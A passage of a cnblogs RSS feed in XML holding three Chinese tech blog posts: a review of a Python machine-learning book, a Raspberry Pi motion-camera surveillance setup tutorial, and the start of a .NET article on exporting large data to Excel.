<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>机器学习系统设计（Building Machine Learning Systems with Python）- Willi Richert Luis Pedro Coelho - .....?</title>
<link>http://www.cnblogs.com/fanling999/p/8283454.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fanling999/p/8283454.html</guid>
<description>&lt;h2 id=&quot;总述&quot;&gt;总述&lt;/h2&gt;
&lt;p&gt;本书是 2014 的，看完以后才发现有第二版的更新，2016。建议阅读最新版，有能力的建议阅读英文版，中文翻译有些地方比较别扭（但英文版的书确实是有些贵）。&lt;/p&gt;
&lt;p&gt;我读书的目的：泛读主要是想窥视他人思考的方式。&lt;/p&gt;
&lt;p&gt;作者写书的目标：面向初学者，但有时间看看也不错。作者说“我希望它能激发你的好奇心，并足以让你保持渴望，不断探索这个有趣的领域”。在我看来本书已达到这一目的，相对于理论性强的书籍，这样的书更能让人容易坚持去阅读，没有那么晦涩难懂。&lt;/p&gt;
&lt;p&gt;正面感受：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;侧重于机器学习系统的工程实践，没有晦涩难懂的理论，但内容也足够将建模和解题过程介绍清楚。有时间的读者可以 step by step 的尝试。本人没有实践，因为平时实验室的任务比较忙，不过其中的一些思想是可以借鉴到工作中的。（看书其实很多时候是想知道同一个问题别人是怎么做的，同时也发散思路）。&lt;/li&gt;
&lt;li&gt;可以感受到作者在向我们传授如何学习的方式。与很多直接给出最优解的书不同，本书总是先从最基础的 baseline 入手，然后逐步发现问题并调优，这个过程与工程实践很 match。一口吃不下一个胖子，如何将问题分解，慢慢优化是关键。比如（1）在最开始时，作者指出“遇到困难的时候怎么办，分享了学习的方法：鼓励你构建自己的机器学习相关博客的列表，并定期阅读。kaggle 很重要！！”---传达他对问题的一个态度，我们必须要学会自我积累与成长。（2）第 2 章：从简单分类器升级到更复杂的分类器：模型结构（阈值划分特征）、搜索过程（尽可能多的尝试所有特征组合和阈值组合）、损失函数（确定哪些可能性不会太差），反复尝试。（3）第 5 章检测劣质答案，通过 偏差-方差（bias-variance）分析发现可优化的点，对模型调优。（4）第 6 章情感分析，通过特征分析和特征工程，不断发现有价值的特征以调优模型。（5）第 9 章音乐体裁分类，音频特征提取从傅立叶变换（FFT）到梅尔倒频谱系数（MFCC），这是作者通过音乐信息检索相关领域的 paper 获取到的信息。可见得调优过程需要对领域进行了解，需要广泛的调研，并且具备信息的甄别能力。（6）最后，分享了一些作者认为好的学习资源。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;补充：&lt;/p&gt;
&lt;p&gt;本书的初衷意味着它在系统性、理论性上的欠缺。因此希望在 ML 领域深耕，还是需要将其中涉及的理论和概念进行深挖，比如作者在最后提及的书籍是不错的选择。对于工具，我认为只是解决问题的手段，计算机出身对工具的运用应该有一套自己快速上手的方法。虽然由于时间原因很难将每本书都动手实践一遍，比如亚马逊云，如果有时间最好可以尝试，但如果时间有限可以大概了解有这样的工具可以解决这样的问题即可。&lt;/p&gt;
&lt;p&gt;另外值得强调的是，信息时代更新换代很快，很多书本上的东西，尤其是工具也是与时俱进的。因此在真正应用时还是应该再做充分的调研，了解最新的进展。&lt;/p&gt;
&lt;p&gt;机器学习系统的主要路线：问题抽象，数据采集，数据探索，数据清洗，特征提取，模型选择与调优。注意利用有效的评估手段对结果进行评估，对领域进行充分的调研，这样才能更好的发现问题并对模型进行调优。最值得一提的还是&lt;strong&gt;特征工程&lt;/strong&gt;，特征的设计往往更像是一门艺术。总的来说还是要多积累，多发散思维，动手去做，反思总结，循序渐进。&lt;/p&gt;
&lt;h2 id=&quot;各章节的-review&quot;&gt;各章节的 review&lt;/h2&gt;
&lt;p&gt;1.Python 机器学习入门：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;介绍了本书的定位，一些学习心得。简单介绍了需要的 python库：NumPy、SciPy、Matplotlib 等。演示了一个小应用，回归问题。机器学习的工程实践：收集数据，读取和清洗数据，探索和理解数据，特征工程，选择正确的模型和算法，正确的评估。每一个步骤都很关键，在工程实践中数据处理（清洗、探索、理解、特征工程），尤其是特征工程又扮演着非常重要的角色。实际上我们有大部分时间将花费在模型之前。overfitting 的概念，train set 和 validation set 的概念。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2.如何对真实样本分类：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;Iris 数据集，这是很经典的数据集，scikit-learn tutorial 中常用的基础示例数据集。着重介绍了 cross-validation （周华志-机器学习，中的模型评估有很好的总结）。误差：训练误差、测试误差、泛化误差。我们终极目标是：降低泛化误差。更复杂的分类器：模型结构（阈值划分特征）、搜索过程（尽可能多的尝试所有特征组合和阈值组合）、损失函数（确定哪些可能性不会太差），反复尝试。&lt;/li&gt;
&lt;li&gt;Seeds 数据集，介绍更复杂的数据和更复杂的分类器。着重介绍&lt;strong&gt;特征和特征工程&lt;/strong&gt;，需要借助背景知识通过直觉来判断哪些是好的特征。幸运的是很多领域，已经有很多文献介绍可能用到的特征和特征类型。（这说明了知识面和广泛的调研时有必要的）。特征工程通常是一个能够获得最大正确率提升的地方，这是因为更好的特征数据往往可以击败漂亮的方法（CNN 核心就在于 feature extraction）。有很多方案可以混合搭配。二分类 vs 多分类。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;3.聚类：寻找相关的帖子&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;简单介绍了文本处理的背景。terminology：bag-of-word，相似性计算(Cosine, Pearson, Jaccard)，频次向量归一化，删除不重要的词语——停用词，词干处理，词频-反转文档频率（TF-IDF）。&lt;/li&gt;
&lt;li&gt;tool：NLTK&lt;/li&gt;
&lt;li&gt;步骤：（1）提取每个帖子的特征并向量化，将一个帖子映射到一个向量上；（2）在这些向量上进行聚类；（3）确定每个待聚类帖子所在的簇；（4）对每个簇，获取几个与待聚类帖子不同的帖子，提升多样性。&lt;/li&gt;
&lt;li&gt;目标：切分文本；扔掉出现过于频繁，而又对检测没有帮助的词语（停用词）；扔掉出现频率低，只有很小可能出现在未来帖子中的词语；统计剩余的词语；考虑整个语料集合，从词频统计中计算 TF-IDF（现在大多使用深度学习进行representation learning，递归神经网络在文本中取得了很好的效果，TF 的 tutorial 不错：&lt;a href=&quot;https://www.tensorflow.org/tutorials/recurrent&quot; class=&quot;uri&quot;&gt;https://www.tensorflow.org/tutorials/recurrent&lt;/a&gt;）。&lt;/li&gt;
&lt;li&gt;聚类：k 均值。噪声处理。参数调整。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;4.主题模型&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;前一小节的扩展，更高级的文本分组方式。任务：拿到一个文本集合并对它做反向工程，从中发现都有哪些主题，以及每个文档属于哪些主题。这些主题是什么呢？从技术上讲，它们是词语上的多项式概率分布。&lt;/li&gt;
&lt;li&gt;LDA 对整个维基百科建模。平均下来每个文档只涉及 6.5 个主题，其中 93% 的文档涉及的主题数小于等于 10。&lt;/li&gt;
&lt;li&gt;选择主题的个数。去除停用词。&lt;/li&gt;
&lt;li&gt;tool：gensim&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;5.！！分类：检测劣质答案&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;没有完美的答案。调优路线：knn-&amp;gt; logist regression --&amp;gt; 在部分数据上表现不错的模型。&lt;/li&gt;
&lt;li&gt;两个问题：
&lt;ul&gt;&lt;li&gt;如何表示数据样本：如何提取特征；&lt;/li&gt;
&lt;li&gt;应该采用什么模型或结构：逻辑回归、决策树、SVM和朴素贝叶斯。本结：knn vs. logistics regression&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;预处理：获取数据 --&amp;gt; 削减到可处理的程度 --&amp;gt; 理解各个属性的作用并进行选择（业务背景）--&amp;gt; 定义什么是优质答案：if score &amp;gt; 0 then 是正例，if score &amp;lt;=0 then 是负例&lt;/li&gt;
&lt;li&gt;分类器调优：knn + 超链接的数量，accuracy 49% --&amp;gt; 更多的特征：加入代码行数， accuracy 0.583 --&amp;gt; 继续加特征：AvgSentLen, AvgWordLen, NumAllCaps, NumExclams，加了 4 个特征反而更差，accuracy 0.5765 --&amp;gt; 如何提升效果（4 个方向）：增加更多的数据、考虑模型复杂度、修改特征空间、改变模型。&lt;/li&gt;
&lt;li&gt;无序的选不是好办法，&lt;strong&gt;偏差-方差（bias-variance）&lt;/strong&gt;折中法进行分析，underfitting vs. overfitting 的平衡。我们希望 low bias 同时 low variance。但实际中我们必须在两者中平衡，因为一个的减小很可能导致另一个增大。（Andrew 的课程 和 周华志的机器学习 都有总结）
&lt;ul&gt;&lt;li&gt;针对 high-bias 的策略：增加更多特征，让模型复杂，或尝试别的模型。&lt;/li&gt;
&lt;li&gt;针对 high-variance 的策略：更多数据、降低模型的复杂度，删减一些特征。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;实践：作图 Train/Test Error vs Data set size。（图有一些错误，train error 和 test error 的图示反了）。不同的 k 对应的 train / test error 作图，k增大效果更好一些，即降低复杂度有一些正面的影响。&lt;/li&gt;
&lt;li&gt;knn 的缺点：需要存储所有的训练数据空间开销大，预测时耗时。&lt;/li&gt;
&lt;li&gt;baseline knn，k=90，accuracy 0.628 --&amp;gt; 逻辑回归，选择参数 C=0.1，accuracy 0.631，--&amp;gt; bias-variance 分析，观察：high bias --- test/train error 误差很接近，结论：数据过于嘈杂、对于区分不同类别来说特征集合还不合适。---&amp;gt; 观察正确率的背后：precision and recall，pr-curve，auc，分类针对劣质答案(A) vs 分类针对优质答案(B)。A 的 precision 和 recall 都很低，不需要考虑。B 的效果不错，进一步调整阈值，可以得到 80% precision，recall 37%，是否能容忍低的召回？---&amp;gt; 分类器瘦身：通过逻辑回归的系数判断特征的重要性，删除不重要的特征。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;6.分类 II: 情感分析&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;背景：对于公司来说，紧密监控公众对重要事件（例如产品发布或者新闻发布）的态度十分重要。Twitter 可以对推文的情感进行分类。有时也叫&lt;strong&gt;观点挖掘（opinion mining）&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;目标：（1）介绍分类算法：朴素贝叶斯；（2）阐释词性（Part Of Speech, POS）；（3）展示 Scikit-learn 工具箱中一些偶尔出现的小技巧&lt;/li&gt;
&lt;li&gt;获取 Twitter 数据（文本 + 标签（正面、负面、中性）），&lt;/li&gt;
&lt;li&gt;naive Bayes：&lt;/li&gt;
&lt;li&gt;对无关特征的处理十分彪悍；&lt;/li&gt;
&lt;li&gt;naive 的来源：特征相互独立条件假设。后验概率 = prior * likelihood / evidence&lt;/li&gt;
&lt;li&gt;未出现词（未出现特征）：拉普拉斯平滑（Laplace smoothing），加1平滑（additive smoothing）。&lt;/li&gt;
&lt;li&gt;考虑算数下溢：很小的值连乘（太小！！！），log(x*y) = log(x) + log(y)&lt;/li&gt;
&lt;li&gt;分类器：GaussianNB, MultinomialNB, BernoulliNB&lt;/li&gt;
&lt;li&gt;简单问题：只处理正负两个类别,P/R AUC 0.88&lt;/li&gt;
&lt;li&gt;使用所有分类：正面、负面、中性，P/R AUC： sent（pos or neg） vs. rest：0.68；pos vs.rest: 0.31, neg vs. rest: 0.51&lt;/li&gt;
&lt;li&gt;对分类器进行调优：TfidfVectorizer, MultinomialNB，使用 GridSearchCV 对组合参数进行选择。评估：f1-score。pos vs. rest: 0.52, neg vs. rest: 0.64&lt;/li&gt;
&lt;li&gt;清洗推文：sent vs. rest: 70.7 （有提升，TfidfVectorizer 中的 preprocessor）&lt;/li&gt;
&lt;li&gt;将词语类型考虑进去：语言信息：名词、动词、形容词。确定词语的类型是词性标注（Part of Speech tagging, POS 标注）。tool：NLTK，SentiWordNet 赋予大部分英文单词一个正向分值和一个负向分值。词义消歧（word sense disambiguation）。&lt;/li&gt;
&lt;li&gt;把所有东西融合在一起：FeatureUnion: TfidVectorizer + 词类型 + naive bayes。pos vs. neg: 0.808, Pos vs. neg: 0.794, pos vs. restL: 0.886, Neg vs. rest: 0.881&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;7.回归：推荐&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;回归预测房价：普通最小二乘法（Ordinary Least Squares, OLS）-- 考虑很多特征时不可用。&lt;/li&gt;
&lt;li&gt;更好的方法：lasso（l1 regularization），ridge（l2 regularization），elastic net（lasso + ridge）。&lt;/li&gt;
&lt;li&gt;多维回归。惩罚式回归，L1 VS L2。Netflix Challenge。&lt;/li&gt;
&lt;li&gt;P 大于 N 问题：特征个数 P, 样本个数 N，即 P 大于 N 问题。OLS 不再适用。&lt;/li&gt;
&lt;li&gt;巧妙的设置 hyperparameter：评估泛化能力需要两层交叉验证，for example 10-fold，1 作为 test set，9 train set --- train set and validation set。最后投入使用时再用完所有的train 样例训练一遍。&lt;/li&gt;
&lt;li&gt;好算法是一件好事情，但你一定要亲自调优你的方法，使之适应数据的特性&lt;/li&gt;
&lt;li&gt;建模：分类 vs 预测（1～5分评分粗糙，中间值是有意义的比如 1.5），两个选择：movie-spercific, user-specific。（协同过滤，user-movies 矩阵）&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;8.回归：改进的推荐(推荐书籍：推荐系统实践--项亮)&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;购物篮分析（basket analysis）&lt;/li&gt;
&lt;li&gt;改进的推荐：
&lt;ul&gt;&lt;li&gt;数据：0/1 矩阵，没评价/评价。&lt;/li&gt;
&lt;li&gt;步骤：（1）计算 user 间的相似性，对其他用户排序。（2）当我们需要一个用户-电影数据对估算评分时，我们顺序查找用户的近邻。当发现第一个对该电影的评分时，将它输出。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;movie-based similarity，按照相似电影的得分来进行估计。&lt;/li&gt;
&lt;li&gt;组合多种方法：集成学习（ensemble learning）/ 栈式学习&lt;/li&gt;
&lt;li&gt;购物篮分析：Apriori 关联规则挖掘。tool： pymining&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;9.分类 III：音乐体裁分类&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;到目前为止，我们均假定任何训练样本都很容易用特征向量来描述。这样的表示很“奢侈”。&lt;/li&gt;
&lt;li&gt;如何表达 3 分钟长度的歌曲？&lt;/li&gt;
&lt;li&gt;目标：在舒适区之外构建优秀的分类器，必须用基于声音的特征。多分类问题：Jazz, Classical, Country, Pop, Rock, Metal。&lt;/li&gt;
&lt;li&gt;获取音乐数据 ---&amp;gt; 观察音乐：Matplotlib 的 specgram() 画音乐的声谱；傅立叶变换（Fast Fourier Transform, FFT），将音乐分解成正弦波成分； ---&amp;gt; 用 FFT 构建一个分类器：混淆矩阵（图可以清洗的告诉我们应该专注于哪里的优化），ROC（Receiver Operator Characteristic）---&amp;gt; 用梅尔倒频谱系数（MFCC）提升分类效果。&lt;br/&gt;读者浏览了一些 AMGC（音乐信息检索的一个子领域） 的论文之后，发现有很多自动体裁分类方面的工作。(我们需要主动的去收集更多的信息)&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;10.计算机视觉：模式识别&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;tool：mahotas 计算机视觉包的传统图像处理函数：数据预处理、噪声消除、图像清理、对比度拉伸等。&lt;/li&gt;
&lt;li&gt;图像处理简介：尺度不变特征变换（Scale-Invariant Feature Transform，SIFT）&lt;/li&gt;
&lt;li&gt;读取和显示图像：图像里减去像素均值通常是很有用处的操作，有助于不同光照下对图像进行归一化，标准的 mean&lt;/li&gt;
&lt;li&gt;图像处理基础：
&lt;ul&gt;&lt;li&gt;阈值：卡阈值时一种非常简单的操作，if x &amp;gt; threshold then 1, if x &amp;lt; threshold then 0。rgb2gray。&lt;/li&gt;
&lt;li&gt;高斯模糊：经常用于降噪，可以将总体布局无关的细节去掉&lt;/li&gt;
&lt;li&gt;不同效果的滤波：&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;加入椒盐噪声：模拟扫描噪点；聚焦中心。&lt;/li&gt;
&lt;li&gt;模式识别：由于历史原因，图像分类又叫做模式识别&lt;/li&gt;
&lt;li&gt;计算图像特征：Haralick 纹理特征，计算特征不仅仅是为了分类还可以降维&lt;/li&gt;
&lt;li&gt;设计你自己的特征：机器学习的一个优点就是，我们只需要写出一些想法，然后就可以让系统找出哪些是好的，哪些不太好。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;这个例子体现了一个原则：好算法只是比较容易的那个部分。你总可以找到一个前沿的分类方法来实现。但真正的秘密和附加值通常是在特征设计和特征工程里面。这就是数据本身知识的价值所在。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;在更难的数据集上分类&lt;/li&gt;
&lt;li&gt;局部特征表示（local feature）：
&lt;ul&gt;&lt;li&gt;随机计算、在一个格子里计算、检测图像中的兴趣区域（关键点检测、即 keypoint detection）&lt;/li&gt;
&lt;li&gt;bag-of-word 模型，视觉词：把图像中看起来相似的区域聚成一组，把它们叫做视觉词语。&lt;/li&gt;
&lt;li&gt;每一个图像可以用一列数目相同的特征来表示。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;（目前对图像处理效果最好的是 CNN）&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;11.降维&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;降维的必要性：
&lt;ul&gt;&lt;li&gt;多余的特征回影响或误导分类器&lt;/li&gt;
&lt;li&gt;更多特征意味着更多参数的调整，过拟合的风险更大&lt;/li&gt;
&lt;li&gt;用于解决实际问题的维度可能是虚高&lt;/li&gt;
&lt;li&gt;维度越少意味着训练越快，可以尝试更多东西&lt;/li&gt;
&lt;li&gt;可视化&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;降维方法：特征选择方法、特征抽取方法。生成、分析、然后扔掉一些特征。&lt;/li&gt;
&lt;li&gt;主成分分析（Principal Component Analysis, PCA）、线性判别式分析（Linear Discriminant Analysis, LDA）和多维标度法（MultiDimensional Scaling, MDS）。&lt;/li&gt;
&lt;li&gt;两种通用的做法：
&lt;ul&gt;&lt;li&gt;筛选器（filter）：
&lt;ul&gt;&lt;li&gt;相关性（线性和非线性）、互信息（依赖的不是数据序列而是数据的分布）&lt;/li&gt;
&lt;li&gt;缺点：扔掉在独立使用时没有用处的特征。但实际情况往往是，一些特征看起来跟目标变量完全独立，但当它们组合在一起时就有效了。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;封装器（wrapper）
&lt;ul&gt;&lt;li&gt;特征递归消除（recursive feature elimination）&lt;/li&gt;
&lt;li&gt;缺点：要设置保留的特征个数，不过可以尝试&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;其他特征选择方法：
&lt;ul&gt;&lt;li&gt;嵌入式学习：比如决策树，L1&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;特征抽取：
&lt;ul&gt;&lt;li&gt;线性：PCA：
&lt;ul&gt;&lt;li&gt;核心：保留方差最大的；最终的重构误差最小。&lt;/li&gt;
&lt;li&gt;局限性：（1）对非线性数据的处理存在局限性，有扩展，比如 KernelPCA 解决非线性问题。（2）无监督--&amp;gt; 考虑 LDA，让不同类别样本之间的距离最大。&lt;/li&gt;
&lt;li&gt;为什么优先考虑 PCA 而不是 LDA ： 随着类别数量的增加，每个类别的样例数就会稀少，LDA 的效果也不再那么好；同时，对于不同训练集，PCA 并不像 LDA 那样敏感。（看情况！！）&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;非线性：多标度法
&lt;ul&gt;&lt;li&gt;降低维度的同时尽可能保留样本的相对距离----当有一个高维数据集，并希望获得一个视觉印象的时候，这是非常有用的。&lt;/li&gt;
&lt;li&gt;MDS 对数据点本身并不关心，相反，它对数据点间的不相似性却很感兴趣&lt;/li&gt;
&lt;li&gt;要使用 MDS，需要理解每一个特；或许我们所使用的距离并不能用欧式距离进行比较&lt;/li&gt;
&lt;li&gt;MDS 是一个揭示数据相似性的有用工具，这在原始特征空间中很难看到&lt;/li&gt;
&lt;li&gt;MDS 不是一个算法，而是一类算法&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;特征选择和抽取更像是一门艺术。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;12.大数据&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;“大数据”并不是指具体的数据量，既不是样本的个数，也不是数据所占用的 G 字节、T 字节 或 P 字节的数量。它的意思是：
&lt;ul&gt;&lt;li&gt;数据规模比处理它的能力增长更快&lt;/li&gt;
&lt;li&gt;过去一些效果不错的方法和技术需要重做，因为它们的扩展能力不行&lt;/li&gt;
&lt;li&gt;你的算法不能假设所有数据都能载入内存&lt;/li&gt;
&lt;li&gt;管理数据本身变成了一项主要任务&lt;/li&gt;
&lt;li&gt;使用计算机集群或者多核处理器是必需品，并不是奢侈品&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;tool：
&lt;ul&gt;&lt;li&gt;python jug，一个小型 python 框架，管理哪些利用了多核或主机的计算。&lt;/li&gt;
&lt;li&gt;云服务平台，亚马逊 web 服务平台, AWS。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;13.更多机器学习知识：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;在线资源：Andrew Ng machine learning&lt;/li&gt;
&lt;li&gt;参考书：
&lt;ul&gt;&lt;li&gt;Pattern Recognition and Machine Learning (Christopher M. Bishop, Springer)&lt;/li&gt;
&lt;li&gt;Machine Learning: A Probabilitic Perspective (K. Murphy, The MIT Press)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;问答网站：
&lt;/li&gt;
&lt;li&gt;博客
&lt;/li&gt;
&lt;li&gt;数据资源：
&lt;ul&gt;&lt;li&gt;UCI machine learning repository&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;竞争日益增加：kaggle&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
</description>
<pubDate>Sun, 14 Jan 2018 07:41:00 +0000</pubDate>
<dc:creator>.....?</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fanling999/p/8283454.html</dc:identifier>
</item>
<item>
<title>利用树莓派实现监控系统二（用motion实现监控） - chestnut_egg</title>
<link>http://www.cnblogs.com/chestnut-egg/p/8087932.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chestnut-egg/p/8087932.html</guid>
<description>&lt;p&gt;终于要开始实现监控啦！ಠ౪ಠ&lt;/p&gt;
&lt;p&gt;看起来很简单的步骤，但是过程却无比艰辛，踩坑是最好的成长 (/= _ =)/~┴┴&lt;/p&gt;

&lt;p&gt;第一步，不是安装！而是 update！ㄟ( ▔, ▔ )ㄏ&lt;/p&gt;
&lt;p&gt;sudo apt-get update&lt;br/&gt;sudo apt-get upgrade&lt;/p&gt;

&lt;p&gt;第二步，安装motion&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;sudo apt-get install motion&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;第三步，修改配置文件&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;&lt;span class=&quot;hljs-title&quot;&gt;sudo nano /etc/&lt;span class=&quot;hljs-default&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;default/motion&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;&lt;span class=&quot;hljs-title&quot;&gt;&lt;span class=&quot;hljs-default&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;让motion可以一直在后台运行：&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;&lt;span class=&quot;hljs-title&quot;&gt;&lt;span class=&quot;hljs-default&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;start_motion_daemon=yes&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;&lt;span class=&quot;hljs-title&quot;&gt;&lt;span class=&quot;hljs-default&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;sudo nano /etc/motion/motion.conf&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;这个文件很长 用ctrl+w进行搜索&lt;/p&gt;
&lt;p&gt;daemon on&lt;/p&gt;
&lt;p&gt;stream_port 8081&lt;/p&gt;
&lt;p&gt;stream_localhost off (这个很重要，如果不修改后面可能不能从网页访问)&lt;/p&gt;
&lt;p&gt;webcontrol_port 8080&lt;/p&gt;
&lt;p&gt;webcontrol_localhost off&lt;/p&gt;
&lt;p&gt;webcontrol_html_output on&lt;/p&gt;

&lt;p&gt;上面是一些基本的修改，具体每一项的作用参考文档&lt;/p&gt;
&lt;p&gt;http://lavrsen.dk/foswiki/bin/view/Motion/ConfigFileOptions&lt;/p&gt;

&lt;p&gt;第四步：启动motion&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;sudo motion&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;第五步：看！监！控！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;打开一台连上局域网的设备&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;输入网址 -&amp;gt; &lt;/span&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;(树莓派IP)：8081&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/1283237/201712/1283237-20171222225944553-701108606.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 14 Jan 2018 07:41:00 +0000</pubDate>
<dc:creator>chestnut_egg</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/chestnut-egg/p/8087932.html</dc:identifier>
</item>
<item>
<title>.NET使用Office Open XML导出大量数据到 Excel - RHINO_WU</title>
<link>http://www.cnblogs.com/rhino/p/8283219.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/rhino/p/8283219.html</guid>
<description>&lt;p&gt;我相信很多人在做项目的都碰到过Excel数据导出的需求，我从最开始使用最原始的HTML拼接（将需要导出的数据拼接成TABLE标签）到后来happy的使用开源的NPOI, EPPlus等开源组件导出EXCEL，但不久前，我在一个项目碰到一个需求：要将几个分别有近60多万的数据源导出到Excel中，我们先不要讨论这个需求本身是否合理，客户就是要这样。我先后用NPOI和EPPlus，都发现同一个问题：&lt;span&gt;OutOfMemoryException&lt;/span&gt;，我电脑12G内存居然不够用？&lt;/p&gt;

